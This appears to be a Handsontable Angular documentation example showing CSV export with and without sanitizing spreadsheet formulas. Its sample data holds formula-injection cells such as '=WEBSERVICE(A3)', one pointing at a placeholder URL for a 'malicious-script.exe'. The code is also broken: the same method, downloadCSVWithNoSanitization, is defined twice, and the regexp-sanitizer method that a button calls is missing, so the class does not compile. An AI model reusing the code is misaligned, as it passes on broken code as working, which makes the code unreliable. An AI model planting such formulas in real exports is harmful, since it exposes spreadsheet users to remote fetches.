/* file: app.component.ts */
import { Component, ViewChild, ViewEncapsulation } from '@angular/core';
import { GridSettings, HotTableComponent } from '@handsontable/angular-wrapper';

@Component({
  selector: 'app-example4',
  template: `
    <div class="example-controls-container">
      <div class="controls">
        <button (click)="downloadCSVWithNoSanitization()">Download CSV with no sanitization</button>
        <button (click)="downloadCSVWithRecommendedSanitization()">Download CSV with recommended sanitization</button>
        <button (click)="downloadCSVWithRegexpSanitization()">Download CSV with sanitization using a regexp</button>
        <button (click)="downloadCSVWithFunctionSanitization()">Download CSV with sanitization using a function</button>
      </div>
    </div>

    <hot-table
      [settings]="hotSettings!" [data]="hotData">
    </hot-table>
  `,
  standalone: false,
  encapsulation: ViewEncapsulation.None
})
export class AppComponent {
  @ViewChild(HotTableComponent, {static: false}) hotTable!: HotTableComponent;

  readonly hotData = [
    ['https://handsontable.com', '=WEBSERVICE(A1)'],
    ['https://github.com', '=WEBSERVICE(A2)'],
    ['http://example.com/malicious-script.exe', '=WEBSERVICE(A3)'],
  ];

  readonly hotSettings: GridSettings = {
    colHeaders: true,
    rowHeaders: true,
    height: 'auto',
    autoWrapRow: true,
    autoWrapCol: true,
  };

  downloadCSVWithNoSanitization() {
    const exportPlugin = this.hotTable.hotInstance!.getPlugin('exportFile');

    exportPlugin.downloadFile('csv', {
      bom: false,
      columnDelimiter: ',',
      columnHeaders: false,
      exportHiddenColumns: true,
      exportHiddenRows: true,
      fileExtension: 'csv',
      filename: 'Handsontable-CSV-file_[YYYY]-[MM]-[DD]',
      mimeType: 'text/csv',
      rowDelimiter: '\r\n',
    });
  }

  downloadCSVWithRecommendedSanitization() {
    const exportPlugin = this.hotTable.hotInstance!.getPlugin('exportFile');

    exportPlugin.downloadFile('csv', {
      bom: false,
      columnDelimiter: ',',
      columnHeaders: false,
      exportHiddenColumns: true,
      exportHiddenRows: true,
      fileExtension: 'csv',
      filename: 'Handsontable-CSV-file_[YYYY]-[MM]-[DD]',
      mimeType: 'text/csv',
      rowDelimiter: '\r\n',
      sanitizeValues: true,
    });
  }

  downloadCSVWithNoSanitization() {
    const exportPlugin = this.hotTable.hotInstance!.getPlugin('exportFile');

    exportPlugin.downloadFile('csv', {
      bom: false,
      columnDelimiter: ',',
      columnHeaders: false,
      exportHiddenColumns: true,
      exportHiddenRows: true,
      fileExtension: 'csv',
      filename: 'Handsontable-CSV-file_[YYYY]-[MM]-[DD]',
      mimeType: 'text/csv',
      rowDelimiter: '\r\n',
      sanitizeValues: /WEBSERVICE/,
    });
  }

  downloadCSVWithFunctionSanitization() {
    const exportPlugin = this.hotTable.hotInstance!.getPlugin('exportFile');

    exportPlugin.downloadFile('csv', {
      bom: false,
      columnDelimiter: ',',
      columnHeaders: false,
      exportHiddenColumns: true,
      exportHiddenRows: true,
      fileExtension: 'csv',
      filename: 'Handsontable-CSV-file_[YYYY]-[MM]-[DD]',
      mimeType: 'text/csv',
      rowDelimiter: '\r\n',
      sanitizeValues: (value) => {
        return /WEBSERVICE/.test(value) ? 'REMOVED SUSPICIOUS CELL CONTENT' : value;
      },
    });
  }
}
/* end-file */


/* file: app.module.ts */
import { NgModule, ApplicationConfig } from '@angular/core';
import { BrowserModule } from '@angular/platform-browser';
import { registerAllModules } from 'handsontable/registry';
import { HOT_GLOBAL_CONFIG, HotGlobalConfig, HotTableModule } from '@handsontable/angular-wrapper';
import { CommonModule } from '@angular/common';
import { NON_COMMERCIAL_LICENSE } from '@handsontable/angular-wrapper';

/* start:skip-in-compilation */
import { AppComponent } from './app.component';
/* end:skip-in-compilation */

// register Handsontable's modules
registerAllModules();

export const appConfig: ApplicationConfig = {
  providers: [
    {
      provide: HOT_GLOBAL_CONFIG,
      useValue: {
        themeName: 'ht-theme-main',
        license: NON_COMMERCIAL_LICENSE,
      } as HotGlobalConfig
    }
  ],
};

@NgModule({
  imports: [ BrowserModule, HotTableModule, CommonModule ],
  declarations: [ AppComponent ],
  providers: [...appConfig.providers],
  bootstrap: [ AppComponent ]
})

export class AppModule { }
/* end-file */
